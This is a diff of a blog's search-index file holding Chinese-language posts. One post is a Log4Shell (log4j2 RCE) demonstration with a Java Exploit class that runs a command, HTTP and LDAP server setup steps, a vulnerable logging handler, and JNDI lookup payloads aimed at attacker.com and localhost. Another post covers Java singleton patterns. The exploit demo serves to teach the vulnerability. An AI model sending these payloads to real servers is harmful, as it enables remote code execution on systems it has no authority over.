+<li>此响应包含注入服务器进程的远程 Java 类文件（例如 ）的路径，<code>http://second-stage.attacker.com/Exploit.class</code></li>
+<li>此注入的有效负载会触发第二阶段，并允许攻击者执行任意代码。</li>
+</ol>
+<h3 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h3><p>具体的代码见 github：<a href="https://github.com/zhouxinghang/log4j2-rce">zhouxinghang/log4j2-rce: log4j2 remote code execution sample (github.com)</a></p>
+<h4 id="编写攻击类"><a href="#编写攻击类" class="headerlink" title="编写攻击类"></a>编写攻击类</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Exploit</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Exploit</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="comment">// 要执行的命令</span></span><br><span class="line">            String[] commands = &#123;<span class="string">&quot;open&quot;</span>, <span class="string">&quot;/System/Applications/Calculator.app&quot;</span>&#125;;</span><br><span class="line">            Process pc = Runtime.getRuntime().exec(commands);</span><br><span class="line">            pc.waitFor();</span><br><span class="line">        &#125; <span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] argv)</span> </span>&#123;</span><br><span class="line">        Exploit e = <span class="keyword">new</span> Exploit();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>会在 mac 系统上启动计算器</p>
+<h4 id="开启-http-服务"><a href="#开启-http-服务" class="headerlink" title="开启 http 服务"></a>开启 http 服务</h4><p>将攻击类 Exploit.java 编译成 Exploit.class 文件。并在 class 目录下启动 Http 服务，用于远程下载攻击类。<code>python3 -m http.server 8100</code></p>
+<h4 id="开启-LDAP-服务"><a href="#开启-LDAP-服务" class="headerlink" title="开启 LDAP 服务"></a>开启 LDAP 服务</h4><p>启动 <code>LDAPRefServer</code> 类，监听 ladp 请求，响应远程 Java 类文件的路径，<a href="http://127.0.0.1:8100/Exploit.class%E3%80%82%E8%A2%AB%E6%94%BB%E5%87%BB%E6%9C%8D%E5%8A%A1%E4%BC%9A%E6%89%A7%E8%A1%8C%E8%AF%A5%E8%BF%9C%E7%A8%8B%E7%B1%BB">http://127.0.0.1:8100/Exploit.class。被攻击服务会执行该远程类</a></p>
+<h4 id="被攻击服务"><a href="#被攻击服务" class="headerlink" title="被攻击服务"></a>被攻击服务</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">VulnerableLog4jExampleHandler</span> <span class="keyword">implements</span> <span class="title">HttpHandler</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">static</span> Logger log = LogManager.getLogger(VulnerableLog4jExampleHandler.class.getName());</span><br><span class="line"></span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * A simple HTTP endpoint that reads the request&#x27;s User Agent and logs it back.</span></span><br><span class="line"><span class="comment">   * This is basically pseudo-code to explain the vulnerability, and not a full example.</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> he HTTP Request Object</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">handle</span><span class="params">(HttpExchange he)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    String userAgent = he.getRequestHeader(<span class="string">&quot;user-agent&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// This line triggers the RCE by logging the attacker-controlled HTTP User Agent header.</span></span><br><span class="line">    <span class="comment">// The attacker can set their User-Agent header to: $&#123;jndi:ldap://attacker.com/a&#125;</span></span><br><span class="line">    log.info(<span class="string">&quot;Request User Agent:&#123;&#125;&quot;</span>, userAgent);</span><br><span class="line"></span><br><span class="line">    String response = <span class="string">&quot;&lt;h1&gt;Hello There, &quot;</span> + userAgent + <span class="string">&quot;!&lt;/h1&gt;&quot;</span>;</span><br><span class="line">    he.sendResponseHeaders(<span class="number">200</span>, response.length());</span><br><span class="line">    OutputStream os = he.getResponseBody();</span><br><span class="line">    os.write(response.getBytes());</span><br><span class="line">    os.close();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在请求被攻击服务时候，设置 <code>user-agent = $&#123;jndi:ldap://127.0.0.1:1389/a&#125;</code>。log4j2 打印 user-agent 值就会执行远程类。</p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://twitter.com/chvancooten/status/1469340927923826691">Cas van Cooten 在 Twitter： “A story in three part 😶 #log4j https://t.co/XMl02BcaJY” / Twitter</a></p>
+<p><a href="https://github.com/mbechler/marshalsec/blob/master/src/main/java/marshalsec/jndi/LDAPRefServer.java">marshalsec/LDAPRefServer.java at master · mbechler/marshalsec (github.com)</a></p>
+]]></content>
+      <tags>
+        <tag>log4j</tag>
+        <tag>rce</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>nginx实现原理</title>
     <url>/nginx-implement.html</url>
     <content><![CDATA[<h2 id="简单理解-Nginx"><a href="#简单理解-Nginx" class="headerlink" title="简单理解 Nginx"></a>简单理解 Nginx</h2><p>nginx 是静态 web 服务器，意思是 engine x。并发量高，性能优越</p>
@@ -1246,61 +1278,6 @@
       </tags>
   </entry>
   <entry>
-    <title>单例模式</title>
-    <url>/singleton.html</url>
-    <content><![CDATA[<h2 id="饿汉式单例"><a href="#饿汉式单例" class="headerlink" title="饿汉式单例"></a>饿汉式单例</h2><p>类加载立即初始化，绝对线程安全，不存在访问安全问题。Spring IOC 容器 ApplicationContext 就是一个饿汉式单例。</p>
-<p>优点：没有任何加锁，执行效率高，用户体验好</p>
-<p>缺点：类加载就初始化，浪费空间</p>
-<span id="more"></span>
-
-<p>简单实例：</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HungrySingleton</span> </span>&#123;</span><br><span class="line">    <span class="comment">/** 也可以放在静态代码块中 */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> HungrySingleton HUNGRY_SINGLETON = <span class="keyword">new</span> HungrySingleton();</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">HungrySingleton</span><span class="params">()</span> </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> HungrySingleton <span class="title">getInstance</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> HUNGRY_SINGLETON;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h2 id="懒汉式单例"><a href="#懒汉式单例" class="headerlink" title="懒汉式单例"></a>懒汉式单例</h2><p>需要时才加载</p>
-<h3 id="通过-double-check-实现："><a href="#通过-double-check-实现：" class="headerlink" title="通过 double-check 实现："></a>通过 double-check 实现：</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LazyDoubleCheckSingleton</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 需要用 volatile 修饰保证可见性和重排序</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">volatile</span> LazyDoubleCheckSingleton lazy;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">LazyDoubleCheckSingleton</span><span class="params">()</span> </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> LazyDoubleCheckSingleton <span class="title">getInstance</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (lazy == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">synchronized</span> (LazyDoubleCheckSingleton.class) &#123;</span><br><span class="line">                <span class="keyword">if</span> (lazy == <span class="keyword">null</span>) &#123;</span><br><span class="line">                    <span class="comment">// 1.分配内存给对象</span></span><br><span class="line">                    <span class="comment">// 2.初始化对象</span></span><br><span class="line">                    <span class="comment">// 3.lazy 指向该对象</span></span><br><span class="line">                    lazy = <span class="keyword">new</span> LazyDoubleCheckSingleton();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> lazy;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<h3 id="通过静态内部类实现："><a href="#通过静态内部类实现：" class="headerlink" title="通过静态内部类实现："></a>通过静态内部类实现：</h3><p>double-check 方法需要加锁，对程序性能有一定影响，用静态内部类实现更好</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> zhouxinghang</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> 2019-05-16</span></span><br><span class="line"><span class="comment"> * 外部类初次加载，会初始化静态变量、静态代码块、静态方法，但不会加载内部类和静态内部类。</span></span><br><span class="line"><span class="comment"> * 实例化外部类，调用外部类的静态方法、静态变量，则外部类必须先进行加载，但只加载一次。</span></span><br><span class="line"><span class="comment"> * 直接调用静态内部类时，外部类不会加载。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LazySingleton</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">LazySingleton</span><span class="params">()</span></span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * final 保证方法不被重写</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> LazySingleton <span class="title">getInstance</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> LazySingletonHolder.LAZY_SINGLETON;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">LazySingletonHolder</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> LazySingleton LAZY_SINGLETON = <span class="keyword">new</span> LazySingleton();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h2 id="单例模式的破坏"><a href="#单例模式的破坏" class="headerlink" title="单例模式的破坏"></a>单例模式的破坏</h2><h3 id="反射破坏单例模式"><a href="#反射破坏单例模式" class="headerlink" title="反射破坏单例模式"></a>反射破坏单例模式</h3><p>尽管构造方法加了 private 修饰，但是可以通过反射调用构造方法，因此对构造方法加以限制，重复创建直接抛出异常。</p>
-<p>以上述 LazySingleton 为例：</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="title">LazySingleton</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">// 如果通过反射来创建实例，就抛出异常</span></span><br><span class="line">    <span class="keyword">if</span> (LazySingletonHolder.LAZY_SINGLETON != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(<span class="string">&quot;不允许创建多个不同实例&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h3 id="序列化破坏单例模式"><a href="#序列化破坏单例模式" class="headerlink" title="序列化破坏单例模式"></a>序列化破坏单例模式</h3><p>在序列化操作时，反序列化后的对象会重新分配内存空间，即重新创建，如果目标是单例对象，就会破坏单例模式。</p>
-<p>对此，我们只需要增加 readResolve() 方法即可。以上述 LazySingleton 为例，修改如下：</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LazySingleton</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">LazySingleton</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="comment">// 如果通过反射来创建实例，就抛出异常</span></span><br><span class="line">        <span class="keyword">if</span> (LazySingletonHolder.LAZY_SINGLETON != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(<span class="string">&quot;不允许创建多个不同实例&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * final 保证方法不被重写</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> LazySingleton <span class="title">getInstance</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> LazySingletonHolder.LAZY_SINGLETON;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 保证反序列化还是原对象</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> Object <span class="title">readResolve</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> LazySingletonHolder.LAZY_SINGLETON;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">LazySingletonHolder</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> LazySingleton LAZY_SINGLETON = <span class="keyword">new</span> LazySingleton();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>至于为什么，需要看 JDK 序列化源码。ObjectInputStream 类的 readObject() -&gt; readObject0() -&gt; readOrdinaryObject() -&gt; invokeReadResolve()。invokeReadResolve 代码如下：</p>
-<p><img data-src="https://raw.githubusercontent.com/zhouxinghang/resources/master/ZBlog/71BF431A-33F0-4C49-A683-69AF7B27BDFE.png" alt="invokeReadResolve"></p>
-<p>而 readResolveMethod 是在在私有方法 ObjectStreamClass() 中赋值的，代码如下：</p>
-<p><img data-src="https://raw.githubusercontent.com/zhouxinghang/resources/master/ZBlog/2143B7C0-E237-45EB-8D0D-FA667EC34717.png" alt="readResolveMethod"></p>
-<p>可见的，如果被序列化的类定义了 readResolve() 方法，就会调用该方法实现反序列化。</p>
-<p>增加 readResolve() 方法可以防止单例模式被破坏，但是在 readOrdinaryObject() 方法中还是会创建一个新对象的，只不过返回的是readResolve() 方法返回值。具体代码如下：</p>
-<p><img data-src="https://raw.githubusercontent.com/zhouxinghang/resources/master/ZBlog/351EE59B-F579-4B54-BE81-50C017D19F31.png" alt="创建一个新对象"></p>
-<p>注册式单例可以避免这个问题</p>
-<h2 id="注册式单例"><a href="#注册式单例" class="headerlink" title="注册式单例"></a>注册式单例</h2><p>注册式单例又称为登记式单例，就是将每一个实例都登记到某一个地方，使用唯一的标 识获取实例。注册式单例有两种写法：一种为容器缓存，一种为枚举登记。枚举单例也是《Effective Java》书中推荐的一种单例实现写法</p>
-<h3 id="枚举单例"><a href="#枚举单例" class="headerlink" title="枚举单例"></a>枚举单例</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">enum</span>  <span class="title">EnumSingleton</span> </span>&#123;</span><br><span class="line">    INSTANCE;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Object date;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">getDate</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> date;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setDate</span><span class="params">(Object date)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.date = date;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> EnumSingleton <span class="title">getInstance</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> INSTANCE;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>通过反编译发现枚举类是通过静态代码块实现的饿汉式单例模式，反编译代码如下：</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span></span><br><span class="line">&#123;</span><br><span class="line">    INSTANCE = <span class="keyword">new</span> EnumSingleton(<span class="string">&quot;INSTANCE&quot;</span>, <span class="number">0</span>);</span><br><span class="line">    $VALUES = (<span class="keyword">new</span> EnumSingleton[] &#123;</span><br><span class="line">        INSTANCE</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>枚举缓存既不会被序列化破坏，也不会被反射破坏。</p>
-<p>对于序列化，在 ObjectInputStream 类中 readEnum() 方法里，发现枚举类型是通过类名和 Class 对象类找到唯一的枚举对象，代码如下：</p>
-<p><img data-src="https://raw.githubusercontent.com/zhouxinghang/resources/master/ZBlog/11AC67F5-4A3E-427F-A758-9C7AA9A20444.png" alt="readEnum"></p>
-<p>对于反射，Constructor 类中的 newInstance() 方法对于枚举类，直接抛出异常：</p>
-<p><img data-src="https://raw.githubusercontent.com/zhouxinghang/resources/master/ZBlog/9286BD38-C4BA-468A-A523-B6EAD2569951.png" alt="newInstance"></p>
-<h3 id="容器缓存单例"><a href="#容器缓存单例" class="headerlink" title="容器缓存单例"></a>容器缓存单例</h3><p>可以看看 Spring 容器式单例实现：</p>
-<p><img data-src="https://raw.githubusercontent.com/zhouxinghang/resources/master/ZBlog/31EC471D-8239-49AC-88B9-BA5C538D97D7.png" alt="Spring容器"></p>
-]]></content>
-      <categories>
-        <category>java</category>
-      </categories>
-      <tags>
-        <tag>源码</tag>
-        <tag>设计模式</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>ThreadLocal</title>
     <url>/threadLocal.html</url>
     <content><![CDATA[<h2 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h2><p>总结 ThreadLocal 实现原理，缺点，InheritableThreadLocal 原理，ThreadLocalRandom 中如何应用 ThreadLocal，Spring Bean 中如何 应用 ThreadLocal</p>
@@ -1359,6 +1336,72 @@
         <tag>源码</tag>
         <tag>spring</tag>
         <tag>threadlocal</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>单例模式</title>
+    <url>/singleton.html</url>
+    <content><![CDATA[<h2 id="饿汉式单例"><a href="#饿汉式单例" class="headerlink" title="饿汉式单例"></a>饿汉式单例</h2><p>类加载立即初始化，绝对线程安全，不存在访问安全问题。Spring IOC 容器 ApplicationContext 就是一个饿汉式单例。</p>
+<p>优点：没有任何加锁，执行效率高，用户体验好</p>
+<p>缺点：类加载就初始化，浪费空间</p>
+<span id="more"></span>
+
+<p>简单实例：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HungrySingleton</span> </span>&#123;</span><br><span class="line">    <span class="comment">/** 也可以放在静态代码块中 */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> HungrySingleton HUNGRY_SINGLETON = <span class="keyword">new</span> HungrySingleton();</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">HungrySingleton</span><span class="params">()</span> </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> HungrySingleton <span class="title">getInstance</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> HUNGRY_SINGLETON;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="懒汉式单例"><a href="#懒汉式单例" class="headerlink" title="懒汉式单例"></a>懒汉式单例</h2><p>需要时才加载</p>
+<h3 id="通过-double-check-实现："><a href="#通过-double-check-实现：" class="headerlink" title="通过 double-check 实现："></a>通过 double-check 实现：</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LazyDoubleCheckSingleton</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 需要用 volatile 修饰保证可见性和重排序</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">volatile</span> LazyDoubleCheckSingleton lazy;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">LazyDoubleCheckSingleton</span><span class="params">()</span> </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> LazyDoubleCheckSingleton <span class="title">getInstance</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (lazy == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">synchronized</span> (LazyDoubleCheckSingleton.class) &#123;</span><br><span class="line">                <span class="keyword">if</span> (lazy == <span class="keyword">null</span>) &#123;</span><br><span class="line">                    <span class="comment">// 1.分配内存给对象</span></span><br><span class="line">                    <span class="comment">// 2.初始化对象</span></span><br><span class="line">                    <span class="comment">// 3.lazy 指向该对象</span></span><br><span class="line">                    lazy = <span class="keyword">new</span> LazyDoubleCheckSingleton();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> lazy;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="通过静态内部类实现："><a href="#通过静态内部类实现：" class="headerlink" title="通过静态内部类实现："></a>通过静态内部类实现：</h3><p>double-check 方法需要加锁，对程序性能有一定影响，用静态内部类实现更好</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> zhouxinghang</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> 2019-05-16</span></span><br><span class="line"><span class="comment"> * 外部类初次加载，会初始化静态变量、静态代码块、静态方法，但不会加载内部类和静态内部类。</span></span><br><span class="line"><span class="comment"> * 实例化外部类，调用外部类的静态方法、静态变量，则外部类必须先进行加载，但只加载一次。</span></span><br><span class="line"><span class="comment"> * 直接调用静态内部类时，外部类不会加载。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LazySingleton</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">LazySingleton</span><span class="params">()</span></span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * final 保证方法不被重写</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> LazySingleton <span class="title">getInstance</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> LazySingletonHolder.LAZY_SINGLETON;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">LazySingletonHolder</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> LazySingleton LAZY_SINGLETON = <span class="keyword">new</span> LazySingleton();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="单例模式的破坏"><a href="#单例模式的破坏" class="headerlink" title="单例模式的破坏"></a>单例模式的破坏</h2><h3 id="反射破坏单例模式"><a href="#反射破坏单例模式" class="headerlink" title="反射破坏单例模式"></a>反射破坏单例模式</h3><p>尽管构造方法加了 private 修饰，但是可以通过反射调用构造方法，因此对构造方法加以限制，重复创建直接抛出异常。</p>
+<p>以上述 LazySingleton 为例：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="title">LazySingleton</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">// 如果通过反射来创建实例，就抛出异常</span></span><br><span class="line">    <span class="keyword">if</span> (LazySingletonHolder.LAZY_SINGLETON != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(<span class="string">&quot;不允许创建多个不同实例&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="序列化破坏单例模式"><a href="#序列化破坏单例模式" class="headerlink" title="序列化破坏单例模式"></a>序列化破坏单例模式</h3><p>在序列化操作时，反序列化后的对象会重新分配内存空间，即重新创建，如果目标是单例对象，就会破坏单例模式。</p>
+<p>对此，我们只需要增加 readResolve() 方法即可。以上述 LazySingleton 为例，修改如下：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LazySingleton</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">LazySingleton</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="comment">// 如果通过反射来创建实例，就抛出异常</span></span><br><span class="line">        <span class="keyword">if</span> (LazySingletonHolder.LAZY_SINGLETON != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(<span class="string">&quot;不允许创建多个不同实例&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * final 保证方法不被重写</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> LazySingleton <span class="title">getInstance</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> LazySingletonHolder.LAZY_SINGLETON;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 保证反序列化还是原对象</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> Object <span class="title">readResolve</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> LazySingletonHolder.LAZY_SINGLETON;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">LazySingletonHolder</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> LazySingleton LAZY_SINGLETON = <span class="keyword">new</span> LazySingleton();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>至于为什么，需要看 JDK 序列化源码。ObjectInputStream 类的 readObject() -&gt; readObject0() -&gt; readOrdinaryObject() -&gt; invokeReadResolve()。invokeReadResolve 代码如下：</p>
+<p><img data-src="https://raw.githubusercontent.com/zhouxinghang/resources/master/ZBlog/71BF431A-33F0-4C49-A683-69AF7B27BDFE.png" alt="invokeReadResolve"></p>
+<p>而 readResolveMethod 是在在私有方法 ObjectStreamClass() 中赋值的，代码如下：</p>
+<p><img data-src="https://raw.githubusercontent.com/zhouxinghang/resources/master/ZBlog/2143B7C0-E237-45EB-8D0D-FA667EC34717.png" alt="readResolveMethod"></p>
+<p>可见的，如果被序列化的类定义了 readResolve() 方法，就会调用该方法实现反序列化。</p>
+<p>增加 readResolve() 方法可以防止单例模式被破坏，但是在 readOrdinaryObject() 方法中还是会创建一个新对象的，只不过返回的是readResolve() 方法返回值。具体代码如下：</p>
+<p><img data-src="https://raw.githubusercontent.com/zhouxinghang/resources/master/ZBlog/351EE59B-F579-4B54-BE81-50C017D19F31.png" alt="创建一个新对象"></p>
+<p>注册式单例可以避免这个问题</p>
+<h2 id="注册式单例"><a href="#注册式单例" class="headerlink" title="注册式单例"></a>注册式单例</h2><p>注册式单例又称为登记式单例，就是将每一个实例都登记到某一个地方，使用唯一的标 识获取实例。注册式单例有两种写法：一种为容器缓存，一种为枚举登记。枚举单例也是《Effective Java》书中推荐的一种单例实现写法</p>
